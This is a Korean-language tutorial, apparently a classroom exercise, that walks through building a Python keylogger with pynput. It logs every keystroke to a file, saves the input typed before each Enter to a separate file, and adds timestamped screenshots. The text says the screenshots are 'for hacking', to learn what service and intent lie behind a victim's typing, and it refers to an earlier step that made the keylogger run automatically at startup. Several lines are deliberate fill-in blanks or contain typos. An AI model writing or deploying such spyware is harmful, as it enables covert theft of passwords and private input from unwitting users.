#### (  )를 경계로 키로그의 작업 결과 저장하기

* 이제 우리는 키로거를 만들었고 컴퓨터가 실행되면 자동으로 키로거가 작동하도록 만들었다.
* 그런데 키로거의 작업 결과를 확인하기가 매우 번거롭다 (한줄씩 저장되기 때문에)

```python
#키로거를 만들기 위해 필요한 모듈과 기록을 위한 모듈을 불러옴

from pynput.keyboard import Key, Listener
import logging
import os

#키로거의 기록을 남길 경로를 설정하고
#경로가 존재하지 않는다면 경로를 만들어줌

path = "C:\py"
if not os.exists(path):
  os.makedirs(path)

#Enter를 칠 때까지 작업 결과를 저장할 리스트를 만들어주기
lst = []

#키로거의 기록을 남김
logging.basicConfig(filename=("C:\py\keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#키보드가 눌릴 때 실행될 함수를 정의
def on_press(key):
    global lst
    logging.info(str(key))
    print(str(key))
    #lst리스트에 str(key)결과를 추가하는 코드 입력해주기
    # 1차 코드 : 만약 Enter키가 눌러졌다면 그때까지의 키로깅 결과를 화면에 출력하기
    if  == "":
      print(lst)
    # 2차 코드 : lst에 있는 내용을 str(문자열)로 변환하여 각각의 리스트 요소 사이에 띄어쓰기를 하나 넣어서 별도 파일(분석.txt)에 저장해주고 lst를 공백으로 만들어주기
      with open("","") as f:
        lst2 = " ".(lst)
        f,write(lst2+'')
        lst = []


#사용자의 키보드 입력을 인식할 리스너 생성 및 설정
with Listener(on_press=on_press) as listener :
    listener.join()
```

#### Enter를 경계로 화면을 캡처하는 기능 추가

* 우리가 만든 키로거는 사용자가 입력한 키보드의 내용을 가져와서 훌륭하게 저장해주지만
* 사실 해킹을 위해서는 사용자가 입력한 정보가 어떤 서비스를 활용하는 것인지, 어떤 의도인지 파악하는 것이 중요하다
* 이를 위해서는 단순 키로깅만으로는 아무래도 부족하다
* 그래서 Enter 키를 누르면 사용자의 화면을 스크린샷으로 저장하는 기능을 추가하고
* 스크린샷의 이름은 스크린샷이 만들어진 시간으로 설정해보자!!

```python
#키로거를 만들기 위해 필요한 모듈과 기록을 위한 모듈을 불러옴

from pynput.keyboard import Key, Listener
import logging
import os
import pyautogui
import time

#키로거의 기록을 남길 경로를 설정하고
#경로가 존재하지 않는다면 경로를 만들어줌

path = "C:\py"
if not os.exists(path):
  os.makedirs(path)

#Enter를 칠 때까지 작업 결과를 저장할 리스트를 만들어주기
lst = []

#키로거의 기록을 남김
logging.basicConfig(filename=("C:\py\keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#키보드가 눌릴 때 실행될 함수를 정의
def on_press(key):
    global lst
    logging.info(str(key))
    print(str(key))
    lst.append(str(key))
    # 1차 코드 : 만약 Enter키가 눌러졌다면 그때까지의 키로깅 결과를 화면에 출력하기
    if str(key) == "Key.enter":
      print(lst)
    # 2차 코드 : lst에 있는 내용을 str(문자열)로 변환하여 각각의 리스트 요소 사이에 띄어쓰기를 하나 넣어서 별도 파일(분석.txt)에 저장해주고 lst를 공백으로 만들어주기
      with open("C:\py\분석.txt","a") as f:
        lst2 = " ".join(lst)
        f.write(lst2+'\n')
        lst = []
    #3차 코드 : filename에 스크린샷을 저장할 위치 및 이름을 연월일-시간분초.png로 설정하고 이를 기반으로 스크린샷을 만들어 저장하기
    filename = +'' + time.strftime("%%%-%%%") + ''


#사용자의 키보드 입력을 인식할 리스너 생성 및 설정
with Listener(on_press=on_press) as listener :
    listener.join()
```
